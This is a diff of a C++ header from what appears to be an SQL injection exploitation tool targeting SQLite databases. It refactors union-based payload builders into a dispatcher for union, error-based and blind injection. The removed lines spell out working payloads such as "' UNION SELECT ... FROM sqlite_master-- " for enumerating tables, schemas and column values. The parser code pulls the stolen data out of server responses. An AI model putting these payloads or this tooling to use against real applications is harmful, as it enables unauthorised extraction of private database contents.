@@ -1,42 +1,43 @@
 #ifndef SQLI_SQLITE
 #define SQLI_SQLITE
 
-#include "sqli_mysql.hpp"
+#define UNION 1
+#define ERROR 2
+#define BLIND 3
+
+#include "../mysql/mysql.hpp"
+#include "union_based.hpp"
 
 struct sqli_sqlite
 {
-        inline static const str_vector _excluded = {
+        inline static const str_vector excluded = {
             "sqlite_sequence",
         };
 
-        // =========================================== UNION BASED PAYLOADS
-        static std::string union_based_tab_payload(const sptr_vector params)
+        static std::string payload(
+            sptr_vector& config,
+            uint8 method_type,
+            uint8 value_type)
         {
-                const std::string offset = *params[0];
-                *params[0] += "null, ";
-                return "' UNION SELECT " + offset + "name " +
-                       "FROM sqlite_master-- ";
+                switch (method_type)
+                {
+                case UNION:
+                        return sqlite_union_based::payload(config, value_type);
+                case ERROR:
+                        return mysql_error_based::payload(config, value_type);
+                case BLIND:
+                        return mysql_blind_based::payload(config, value_type);
+                default:
+                        return std::string();
+                }
         };
 
-        static std::string union_based_col_payload(const sptr_vector params)
+        static str_vector parser(
+            const std::string& response,
+            sptr_vector& config,
+            const uint8& method_type,
+            const uint8& value_type)
         {
-                return "' UNION SELECT " + *params[1] + "sql " +
-                       "FROM sqlite_master " +
-                       "WHERE type='table' " +
-                       "AND name='" + *params[0] + "'-- ";
-        };
-
-        static std::string union_based_val_payload(
-            const sptr_vector params)
-        {
-                return "' UNION SELECT " + *params[2] + *params[1] + " " +
-                       "FROM " + *params[0] + "-- ";
-        };
-
-        // =========================================== UNION BASED PARSER
-        static str_vector union_based_parser(const std::string& response)
-        {
-                str_vector values;
                 Json::Value entries;
                 std::string errors;
                 Json::CharReaderBuilder builder;
@@ -48,14 +49,18 @@ struct sqli_sqlite
                 {
                         std::cerr << "[ ERROR ] Could not parse server response."
                                   << std::endl;
-                        return values;
+                        return str_vector();
                 }
+                if (value_type == COLUMNS)
+                        return col_parser(response, entries);
+
+                str_vector values;
                 for (const auto& member : entries.getMemberNames())
                 {
                         if (!entries[member].isArray())
                                 continue;
                         if (entries[member].empty())
-                                values.push_back(std::string());
+                                return str_vector();
 
                         for (const auto& array : entries[member])
                         {
@@ -66,25 +71,13 @@ struct sqli_sqlite
                         }
                 }
                 return values;
-        };
+        }
 
-        static str_vector union_based_column_parser(const std::string& response)
+        static str_vector col_parser(
+            const std::string& response,
+            Json::Value& entries)
         {
                 str_vector values;
-                Json::Value entries;
-                std::string errors;
-                Json::CharReaderBuilder builder;
-                std::unique_ptr< Json::CharReader > reader(builder.newCharReader());
-                if (!reader->parse(
-                        response.c_str(),
-                        response.c_str() + response.size(),
-                        &entries,
-                        &errors))
-                {
-                        std::cerr << "[ ERROR ] Could not parse server response."
-                                  << std::endl;
-                        return values;
-                }
                 std::string schema;
                 size_t start;
                 size_t end;
@@ -149,7 +142,8 @@ struct sqli_sqlite
                                 }
                         }
                         return values;
-                };
-        }
+                }
+                return values;
+        };
 };
 #endif
